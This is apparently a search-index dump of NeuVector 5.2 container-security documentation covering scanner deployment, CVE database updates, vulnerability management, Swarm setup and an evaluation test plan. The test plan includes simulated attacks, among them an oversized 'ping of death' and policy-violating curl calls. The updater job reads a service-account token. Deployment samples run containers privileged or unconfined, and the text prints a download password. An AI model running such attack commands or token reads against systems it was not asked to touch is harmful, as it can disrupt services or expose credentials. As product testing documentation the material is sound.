bandwidth.  Large images will take more time to pull as well as need to be expanded to scan them, consuming more memory. Make sure each scanner has enough memory allocated to it to handle more than the largest expected image (10% more minimum).  Multiple scanner pods can be deployed to the same host/node, but considerations should be made to ensure the host has enough memory, CPU, and network bandwidth for maximizing scanner performance.  ","version":"5.2","tagName":"h3"},{"title":"Standalone Scanner for Local Scanning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/5.2/scanning/scanners#standalone-scanner-for-local-scanning","content":" NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). In the sample docker run below, the local image will be scanned and the results stored at the /var/neuvector locally. For local scanning, the image must be able to be accessed through the mounted docker.sock, otherwise a registry can be specified.  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_ON_DEMAND=true -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   The following scanner environment variables can be used in the docker run command:  SCANNER_REGISTRY= url of the registry (optional instead of local scan)SCANNER_REPOSITORY= repository to scanSCANNER_TAG= version tagSCANNER_REGISTRY_USERNAME= user (optional instead of local scan)SCANNER_REGISTRY_PASSWORD= password (optional instead of local scan)SCANNER_SCAN_LAYERS= true or false (to return layered scan results)SCANNER_ON_DEMAND=true (required)CLUSTER_JOIN_ADDR (optional), CLUSTER_JOIN_PORT (optional) - to send results to controller for use in Admission control rules (Kubernetes deployed controller).CLUSTER_ADVERTISED_ADDR (optional) - if scanner is on different host than controller, to send results for use in Admission control rules (Kubernetes deployed controller).  Host Scanning in Standalone Mode​  Use the following command to scan the host.  caution Requires privileged mode!  docker run --rm --privileged --pid=host neuvector/scanner -n neuvector   Manual Deployment of Multiple Scanners on Kubernetes​  To manually deploy scanners as part of an existing Kubernetes deployment, create a new role binding:  kubectl create rolebinding neuvector-admin --clusterrole=admin --serviceaccount=neuvector:default -n neuvector   Or for OpenShift  oc adm policy add-role-to-user admin system:serviceaccount:neuvector:default -n neuvector   Use the file below to deploy multiple scanners. Edit the replicas to increase or decrease the number of scanners running in parallel.  apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-scanner-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-scanner-pod strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 2 template: metadata: labels: app: neuvector-scanner-pod spec: containers: - name: neuvector-scanner-pod image: neuvector/scanner imagePullPolicy: Always env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   Next, create or update the CVE database updater cron job. This will update the CVE database nightly.  apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"5.2","tagName":"h3"},{"title":"Vulnerability Management","type":0,"sectionRef":"#","url":"/5.2/scanning/scanning/vulnerabilities","content":"","keywords":"","version":"5.2"},{"title":"Managing Vulnerabilities with NeuVector​","type":1,"pageTitle":"Vulnerability Management","url":"/5.2/scanning/scanning/vulnerabilities#managing-vulnerabilities-with-neuvector","content":" NeuVector enables automated vulnerability scanning and management throughout the pipeline. Best practices for managing vulnerabilities in NeuVector include:  Scan during the build-phase, failing the build if there are critical vulnerabilities 'with fix available.' This forces developers to address fixable vulnerabilities before storing in registries.Scan staging and production registries continuously to look for newly discovered vulnerabilities. Vulnerabilities with fixes available can be required to be fixed immediately, or a grace period allowed to provide time to remediate them.Configure Admission Control rules to block deployments into production based on criteria such as critical/high, fix available, and reported date.Continuously scan the production nodes/hosts, containers, and orchestration platform for vulnerabilities for newly discovered vulnerabilities. Implement responses based on criticality/severity that can be webhook alerts (that contact security and developer), quarantine container, or start a grace period for remediation.Ensure running containers are in Monitor or Protect mode with appropriate whitelist rules to 'virtually patch' vulnerabilities to prevent any exploit in production.Scan distroless and PhotonOS based images.  The Dashboard in NeuVector presents a summary risk score which includes vulnerabilities, which can be used to reduce risk from vulnerabilities. See how to improve the risk score for more details.  The other main tool for reviewing, filtering, and reporting on vulnerabilities is in the Security Risks menu.  Security Risks Menu - Vulnerabilities​  This menu combines the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting.  The Vulnerabilities menu provides a powerful explorer tool to:  Make it easy to filter for viewing or downloading of reports, by typing in a search string or using the advanced filter next to the box. The advanced filter allows users to filter vulnerabilities by fix available (or not available), urgency, workloads, service, container, nodes or namespace names.Understand the Impact of vulnerabilities and compliance checks by clicking on the impact row and reviewing remediation and impacted images, nodes, or containers.View the Protection Status (exploit risk) of any vulnerability or compliance issue to see if there are NeuVector Run-Time security protections (rules) enabled for impacted nodes or containers.'Accept' a vulnerability/CVE after it has been reviewed to hide it from views and suppress it from reports.    Use the filter box to enter a string match, or use the advanced filter next to it to select more specific criteria, as shown below. Downloaded PDF and CSV reports will show only the filtered results.    Selecting any CVE listed provides additional details about the CVE, remediation, and which images, nodes, or containers are Impacted. The Protection State icon (circle) shows various colors to indicate a rough percentage of the impacted items which are unprotected by NeuVector during run-time, protected by NeuVector rules (in a Monitor or Protect mode), or unaffected in run-time (e.g. an image scanned with this vulnerability has no running containers). The Protection State column color scheme is:  Black = unaffectedGreen = protected by NeuVector with Monitor or Protect modeRed = unprotected by NeuVector, still in Discover mode  The Impact analysis window (showing affected images, nodes, containers) color scheme is:  Black = unaffected. There are no containers using this image in productionPurple = running in Monitor mode in productionDark Green = running in Protect mode in productionLight Blue = running in Discover mode in production (unprotected)  The Impact colors are meant to correspond to the run-time protection colors for Discover, Monitor and Protect modes in other places in the NeuVector console.  Accepting Vulnerabilities​  You can 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.  To Accept a vulnerability globally, go to the Security Risks -&gt; Vulnerabilities page and select the vulnerability, then Accept. This will create a Vulnerability Profile for this CVE globally.    To Accept a vulnerability found in an image scan, open the image scan results in Assets -&gt; Registries, pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this image. NOTE: This action will create a Vulnerability Profile entry for this CVE in this IMAGE only.    To Accept a vulnerability found in a container in Assets -&gt; Containers, select the vulnerability and pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this container. NOTE: This action will create a Vulnerability Profile for this CVE in this NAMESPACE only.    This action can also be performed in Assets -&gt; Nodes, which will create a Vulnerability Profile for the CVE for all containers, images and namespaces.  important Globally Accepted vulnerabilities are excluded from the view in Security Risks -&gt; Vulnerabilities and in exported reports from this page. Accepted vulnerabilities which are limited to specific images or namespaces will continue to show in the view, but be excluded for reports where the Advanced Filter limits the view to those images or namespaces.  Managing Vulnerability Profiles​  Each accepted vulnerability/CVE creates an entry in the Security Risks -&gt; Vulnerability Profile list. These entries can be edited to add or remove attributes such as image name(s) and namespace(s).    New accepted vulnerabilities can also be added here by entering the CVE name to be Accepted. ","version":"5.2","tagName":"h3"},{"title":"Deployment Examples for Special Deployments Using the Allinone Container","type":0,"sectionRef":"#","url":"/5.2/special","content":"Deployment Examples for Special Deployments Using the Allinone Container How to deploy NeuVector using Kubernetes, OpenShift, Docker EE/UCP, Rancher, public cloud Kubernetes services and more…","keywords":"","version":"5.2"},{"title":"Updating the CVE Database","type":0,"sectionRef":"#","url":"/5.2/scanning/updating","content":"","keywords":"","version":"5.2"},{"title":"Updating the NeuVector CVE Vulnerability Database​","type":1,"pageTitle":"Updating the CVE Database","url":"/5.2/scanning/updating#updating-the-neuvector-cve-vulnerability-database","content":" The Scanner image/pod performs the scans with its internal CVE database. The scanner image is updated on the NeuVector Docker Hub registry with the latest CVE database frequently, as often as daily if there are updates. To update the CVE database used in scanning, simply pull and deploy the latest Scanner image. The latest database version number can be found listed here.  A container called the Updater performs the task of restarting the scanner pods in order to force a pull of the latest image, which will update the CVE database. To automatically check for updates and update the scanner, an updater cron job can be created.  By default, the updater cron job shown below is automatically started from the sample deployment yaml files for Kubernetes and OpenShift. This will automatically check for new CVE database updates through new scanner versions published on the NeuVector Docker hub registry. Manual updates on docker native deployments are shown below. For OpenShift deployments or others where images have to be manually pulled from NeuVector, the scanner with the 'latest' tag should be pulled from NeuVector to update the CVE database.  For registry scanning, if the box 'Rescan after CVE DB update' is enabled, all images in that registry will be rescanned after a CVE database update. For run-time scanning, all running assets will be rescanned after a CVE database update if the Auto-Scan feature is enabled.  Updater Cron Job​  This cron job is deployed by NeuVector automatically as part of the sample deployment, so is typically not required to start manually.  The Updater is a container image which, when run, restarts the scanner deployment, forcing the pull of the latest Scanner image. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up.  The cron job sample neuvector-updater.yaml below for Kubernetes 1.8 and later runs the updater every day at midnight. The schedule can be adjusted as desired.  Sample updater yaml:  apiVersion: batch/v1 kind: CronJob metadata: name: neuvector-updater-pod namespace: neuvector spec: schedule: &quot;0 0 * * *&quot; jobTemplate: spec: template: metadata: labels: app: neuvector-updater-pod spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never   note If the allinone container was deployed instead of the controller, replace neuvector-svc-controller.neuvector with neuvector-svc-allinone.neuvector  To run the cron job  kubectl create -f neuvector-updater.yaml   ","version":"5.2","tagName":"h3"},{"title":"Docker Native Updates​","type":1,"pageTitle":"Updating the CVE Database","url":"/5.2/scanning/updating#docker-native-updates","content":" important Always use the :latest tag when pulling and running the scanner image to ensure the latest CVE database is deployed.  For docker native:  docker stop scanner docker rm &lt;scanner id&gt; docker pull neuvector/scanner:latest &lt;docker run command from below&gt;   note docker rm -f &lt;scanner id&gt; can also be used to force stop and removal of the running scanner.  For docker-compose  docker-compose -f file.yaml down docker-compose -f file.yaml pull // pre-pull the image before starting the scanner docker-compose -f file.yaml up -d   Sample docker run  docker run -td --name scanner -e CLUSTER_JOIN_ADDR=controller_node_ip -e CLUSTER_ADVERTISED_ADDR=node_ip -e SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 -p 18402:18402 -v /var/run/docker.sock:/var/run/docker.sock:ro neuvector/scanner:latest   And sample docker-compose  Scanner: image: neuvector/scanner:latest container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip - CLUSTER_ADVERTISED_ADDR=node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   ","version":"5.2","tagName":"h3"},{"title":"CVE Database Version​","type":1,"pageTitle":"Updating the CVE Database","url":"/5.2/scanning/updating#cve-database-version","content":" The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the scanner container logs or updater image.  To use the REST API to query the version:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   Using kubectl:  kubectl logs neuvector-scanner-pod-5687dcb6fd-2h4sj -n neuvector | grep version   Sample output:  2020-09-15T00:00:57.909|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2020-09-14T10:37:56Z version=2.04 2020-09-15T00:01:10.06 |DEBU|SCN|main.scannerRegister: - entries=47016 join=neuvector-svc-controller.neuvector:18400 version=2.040   Or for docker:  docker logs &lt;scanner container id or name&gt; | grep version   2020-09-15T00:00:57.909|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2020-09-14T10:37:56Z version=2.04 2020-09-15T00:01:10.06 |DEBU|SCN|main.scannerRegister: - entries=47016 join=neuvector-svc-controller.neuvector:18400 version=2.040   ","version":"5.2","tagName":"h3"},{"title":"Manual Updates on Kubernetes​","type":1,"pageTitle":"Updating the CVE Database","url":"/5.2/scanning/updating#manual-updates-on-kubernetes","content":" Below is an example for manually updating the CVE database on Kubernetes or OpenShift.  Run the updater file below  kubectl create -f neuvector-manual-updater.yaml   Sample file  apiVersion: v1 kind: Pod metadata: name: neuvector-updater-pod namespace: neuvector spec: containers: - name: neuvector-updater-pod image: neuvector/updater imagePullPolicy: Always command: - /bin/sh - -c - TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`; /usr/bin/curl -kv -X PATCH -H &quot;Authorization:Bearer $TOKEN&quot; -H &quot;Content-Type:application/strategic-merge-patch+json&quot; -d '{&quot;spec&quot;:{&quot;template&quot;:{&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/restartedAt&quot;:&quot;'`date +%Y-%m-%dT%H:%M:%S%z`'&quot;}}}}}' 'https://kubernetes.default/apis/apps/v1/namespaces/neuvector/deployments/neuvector-scanner-pod' restartPolicy: Never  ","version":"5.2","tagName":"h3"},{"title":"Testing","type":0,"sectionRef":"#","url":"/5.2/testing","content":"Testing Evaluate and Test NeuVector Using Sample Applications","keywords":"","version":"5.2"},{"title":"Mirantis Kubernetes Engine","type":0,"sectionRef":"#","url":"/5.2/special/docker","content":"","keywords":"","version":"5.2"},{"title":"Mirantis Kubernetes Engine​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/5.2/special/docker#mirantis-kubernetes-engine","content":" Deploy to Kubernetes using the Kubernetes Allinone container.  ","version":"5.2","tagName":"h3"},{"title":"Deploy to Swarm Cluster​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/5.2/special/docker#deploy-to-swarm-cluster","content":" It’s simple to deploy NeuVector using a Swarm cluster. First, pull the NeuVector images using Docker UCP in the Images menu. You may need to add a version number to get the latest version on Docker Hub.  Currently, Swarm/UCP does not support the seccomp capabilities (cap_add options) or deploying in ‘privileged mode’ so the NeuVector containers will need to be deployed from the command line using docker-compose or run. See the sample compose files for the allinone and enforcer below.  The Docker UCP HRM service uses the default port 8443 which conflicts with the NeuVector console port. If using the default HRM port, then change the NeuVector port mapping, for example 9443:8443 for the allinone container in the examples below. After the NeuVector application is successfully deployed, login to the console on port 9443 of the allinone host.  ","version":"5.2","tagName":"h3"},{"title":"Deploy on Docker Swarm Using Privileged Mode​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/5.2/special/docker#deploy-on-docker-swarm-using-privileged-mode","content":" The following is an example of the docker-compose file to deploy the all-in-one container on the first node. Because the all-in-one container has an enforcer module inside, application containers on the same node can be secured. Both greenfield and brownfield deployment are supported.  Deploy all-in-one using docker-compose (privileged mode):  allinone: pid: host image: neuvector/allinone:&lt;version&gt; container_name: allinone privileged: true environment: - CLUSTER_JOIN_ADDR=node_ip ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 9443:8443 volumes: - /lib/modules:/lib/modules - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   The most important environment variable is the CLUSTER_JOIN_ADDR. It is the IP address that other enforcers connect to. Normally, it should be set to the IP address of the node where all-in-one container is running.  Port 18300 and 18301 are default ports for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Add an enforcer container using docker-compose (privileged mode)  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning.  Sample docker-compose for the Scanner:  Scanner: image: neuvector/scanner container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   ","version":"5.2","tagName":"h3"},{"title":"Deployment Without Using Privileged Mode​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/5.2/special/docker#deployment-without-using-privileged-mode","content":" For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmour profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.  Deploy allinone (NO privileged mode) with docker-compose  allinone: pid: host image: neuvector/allinone container_name: neuvector.allinone cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 9443:8443 volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Deploy enforcer (NO privileged mode) with docker-compose  enforcer: pid: host image: neuvector/enforcer container_name: neuvector.enforcer cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro  ","version":"5.2","tagName":"h3"},{"title":"General Guidelines","type":0,"sectionRef":"#","url":"/5.2/special/general","content":"","keywords":"","version":"5.2"},{"title":"Testing NeuVector Using the Allinone Container​","type":1,"pageTitle":"General Guidelines","url":"/5.2/special/general#testing-neuvector-using-the-allinone-container","content":" The examples in this section deploy the Allinone and Enforcer containers. This is useful for trying out NeuVector. For production deployments where the Manager, Controller, and Enforcers can all be deployed separately, please see the section Deploying NeuVector.  ","version":"5.2","tagName":"h3"},{"title":"General Guidelines for Deployment​","type":1,"pageTitle":"General Guidelines","url":"/5.2/special/general#general-guidelines-for-deployment","content":" Prepare your host environment for proper installation. Make sure the NeuVector containers can communicate with each other between hosts. Then review and edit the sample files for you environment.  Generally, it is important to do the following:  Label nodes appropriately. If you use node labels to control where the allinone or controller is deployed, label them before deploying.Make sure volumes can be mapped properly. For example  volumes: - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Open required ports on hosts. Make sure the required ports are mapped properly and open on the host. The allinone requires 8443 (if using the console), 18300, 18301, 18400, and 18401. The Enforcer requires 18301 and 18401. (Docker native only) Edit the CLUSTER_JOIN_ADDR. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the sample files for both allinone and enforcer.  ","version":"5.2","tagName":"h3"},{"title":"Helm Deployment​","type":1,"pageTitle":"General Guidelines","url":"/5.2/special/general#helm-deployment","content":" Automated deployment using helm is available is at https://github.com/neuvector/neuvector-helm.  ","version":"5.2","tagName":"h3"},{"title":"Accessing the Console​","type":1,"pageTitle":"General Guidelines","url":"/5.2/special/general#accessing-the-console","content":" Please see the first section Basics -&gt; Connect to Manager for options for turning off https or accessing the console through a corporate firewall which does not allow port 8443 for the console access. ","version":"5.2","tagName":"h3"},{"title":"Evaluating and Testing NeuVector","type":0,"sectionRef":"#","url":"/5.2/testing/testing","content":"","keywords":"","version":"5.2"},{"title":"Sample Applications​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/5.2/testing/testing#sample-applications","content":" After you’ve deployed the NeuVector components you can evaluate it using the sample test applications we provide. These are located in the ’nvbeta’ repository on docker hub.  A typical Kubernetes-based test environment would have a master node and two to three worker nodes. You can control if application pods and NeuVector containers are deployed on a master node (off by default).  ","version":"5.2","tagName":"h3"},{"title":"Kubernetes Test Plan​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/5.2/testing/testing#kubernetes-test-plan","content":" To deploy a multi-tier application using Nginx, Nodejs, and Redis, use the samples below (in the order below). These may need to be edited for deployment on OpenShift, Rancher and other Kubernetes based tools.  Create a demo namespace  kubectl create namespace demo   note The sample below use apiVersion: apps/v1 required by Kubernetes 1.16+.  Create the Redis service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: redis namespace: demo spec: ports: - port: 6379 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-6379&quot; clusterIP: None selector: app: redis-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: redis-pod namespace: demo spec: selector: matchLabels: app: redis-pod template: metadata: labels: app: redis-pod spec: containers: - name: redis-pod image: redis   Create the Nodejs service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: node namespace: demo spec: ports: - port: 8888 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-8888&quot; clusterIP: None selector: app: node-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: node-pod namespace: demo spec: selector: matchLabels: app: node-pod replicas: 3 template: metadata: labels: app: node-pod spec: containers: - name: node-pod image: nvbeta/node   Create the Nginx service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: nginx-webui namespace: demo spec: ports: - port: 80 name: webui protocol: TCP type: NodePort selector: app: nginx-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx-pod namespace: demo spec: selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx-pod image: nvbeta/swarm_nginx ports: - containerPort: 80 protocol: TCP   To access the Nginx-webui service externally, find the random port assigned to it (mapped to port 80) by the NodePort:  kubectl get svc -n demo   Then connect to the public IP address/port for one of the kubernetes nodes, e.g. ‘http://(public_IP):(NodePort)’  After deploying NeuVector, you can run test traffic through the demo applications to generate the whitelist rules, and then move all services to Monitor or Protect mode to see violations and attacks.  Generating Network Violations on Kubernetes​  To generate a violation from a nodejs pod, find a pod:  kubectl get pod -n demo   Then try some violations (replace node-pod-name):  kubectl exec node-pod-name curl www.google.com -n demo   Or find the internal IP address of another node pod, like 172.30.2.21 in the example below, to connect from one node to another:  kubectl exec node-pod-name curl 172.30.2.21:8888 -n demo   Generate a Threat/Attack​  To simulate an attack, log into a container, then try a ping attack:  kubectl exec -it node-pod-name bash -n demo   Use the internal IP of another node pod:  ping 172.30.2.21 -s 40000   For all of the above, you can view the security events in the NeuVector console Network Activity map, as well as the Notifications tab.  Process and File Protection Tests​  Try various process and file activity by exec'ing into a container and running commands such as apt-get update, ssh, scp or others. Any process activity or file access not allowed will generate alerts in Notifications.  Registry Scanning and Admission Control​  A popular test is to configure image scanning of a registry in Assets -&gt; Registries. After the scan is complete, configure an Admission Control rule in Policy. Be sure to enable Admission Controls and set a rule to Deny when there are high vulnerabilities in an image. Then pick an image that has high vulnerabilities and try to deploy it in Kubernetes. The deployment will be blocked in Protect mode and you will see an event in Notifications -&gt; Security Risks.  More advanced admission control testing can be done using different criteria in rules, or combining criteria.  Deploy Another App​  The Kubernetes Guestbook demo application can also be deployed on Kubernetes. It is recommended to deploy it into its own namespace so you can see namespace based filtering in the NeuVector console.  ","version":"5.2","tagName":"h3"},{"title":"Docker-native Test Plan​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/5.2/testing/testing#docker-native-test-plan","content":" After deploying the NeuVector components and the sample application(s) you’ll be able to Discover, Monitor and Protect running containers. The test plan below provides suggestions for generating run-time violations of allowed application behavior and scanning containers for vulnerabilities.  NeuVector Test Plan  If the link above does not work, you can download it from our website using password nv1851blvd.  NeuVector can also detect threats to your containers such as DDOS attacks. If you run a tool to generate such attacks on your containers, these results will show in Network Activity and in the Dashboard.  For example, a simple ping command with high payload will show the Ping.Death attack in the console. To try this, do the following to the IP address of one of the containers (internal IP of the container).  ping &lt;container_ip&gt; -s 40000   In Kubernetes you can do this from any node including the master. In other environments you may need to be logged into the node where the container is running. ","version":"5.2","tagName":"h3"},{"title":"Troubleshooting NeuVector Deployments","type":0,"sectionRef":"#","url":"/5.2/troubleshooting","content":"Troubleshooting NeuVector Deployments How to troubleshoot NeuVector Deployments and collect logs for support.","keywords":"","version":"5.2"},{"title":"Update the NeuVector Containers","type":0,"sectionRef":"#","url":"/5.2/updating","content":"Update the NeuVector Containers How to update the NeuVector components","keywords":"","version":"5.2"},{"title":"Troubleshooting","type":0,"sectionRef":"#","url":"/5.2/troubleshooting/troubleshooting","content":"","keywords":"","version":"5.2"},{"title":"Troubleshooting NeuVector Deployments​","type":1,"pageTitle":"Troubleshooting","url":"/5.2/troubleshooting/troubleshooting#troubleshooting-neuvector-deployments","content":" The NeuVector containers are deployed, managed, and updated using the same orchestration tool used for application workloads. Please be sure to review the online documentation for each step necessary during deployment. Often deployments are attempted by just copying the sample yaml files and deploying them without reviewing the steps prior, such as properly configuring registries, secrets, or RBACs/rolebindings.  Initial Deployment​  Check that the NeuVector containers can be pulled with correct authentication. Check the secret used and make sure the cluster is able to access the appropriate registry.Make sure the changes to the yaml required (e.g. NodePort or LoadBalancer) or Helm values settings are set appropriately.Check the platform and container run-time and make changes as needed (e.g. PKS, containerd, CRI-O).  Login and Initial Configuration​  Check to make sure appropriate access to the manager (IP address, port, route) is allowed through firewalls.  Ongoing Operation​  Directory integration. NeuVector supports specific configurations for LDAP/AD and other integrations for groups and roles. Contact NeuVector for additional troubleshooting steps and a tool for AD troubleshooting.Registry scanning. Most issues are related to registry authentication errors or inability for the controller to access the registry from the cluster.For performance issues, make sure the scanner is allocated enough memory for scanning large images. Also, CPU and memory minimums can be specified in the pod policy to ensure adequate performance at scale.Admission Control. See the Troubleshooting section in the section Security Risks... -&gt; Admission Controls.  Updating​  Use rolling updates for the controller. If you are rebooting hosts, make sure to monitor the controllers as they move to other hosts, or redeploy on the rebooted hosts, to make sure they are able to start, join the controller cluster, and stabilize/sync. Rebooting all hosts at once or too quickly can result in unknown states for the controllers.Use a persistent volume claim to store the NeuVector configuration for the case that all controllers/nodes go down in the cluster.When updating to a new version, review the online documentation to identify changes/additions to the yaml required, as well as other changes such as rolebindings or new services (e.g. admission control webhook, persistent volume claim etc).  ","version":"5.2","tagName":"h3"},{"title":"Debug Logs​","type":1,"pageTitle":"Troubleshooting","url":"/5.2/troubleshooting/troubleshooting#debug-logs","content":" To view the logs of a NeuVector container, for example a controller pod  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector   These logs may show cluster connectivity issues, admin actions, scanning activity and other useful entries. If there are multiple controllers running it may be necessary to inspect each one. These logs can be piped to a file to send to NeuVector support.  Turning on Debug mode for NeuVector Controllers​  For issues that require in-depth investigation, debug mode can be enabled for the controllers/allinones, which will log detailed information. This can increase the log file size by a large amount, so it is recommended to turn it off after collecting them.  Kubernetes, OpenShift and Other Orchestration Logs​  It can be helpful to inspect the logs from orchestration tools to see all deployment activity including pod creation timestamps and status, deployments, daemonsets and other management actions of the NeuVector containers performed by the orchestration tool.  kubectl get events -n neuvector   ","version":"5.2","tagName":"h3"},{"title":"Support Log​","type":1,"pageTitle":"Troubleshooting","url":"/5.2/troubleshooting/troubleshooting#support-log","content":" The support log contains additional information which is useful for NeuVector Support, including system configuration, containers, policies, notifications, and NeuVector container details. 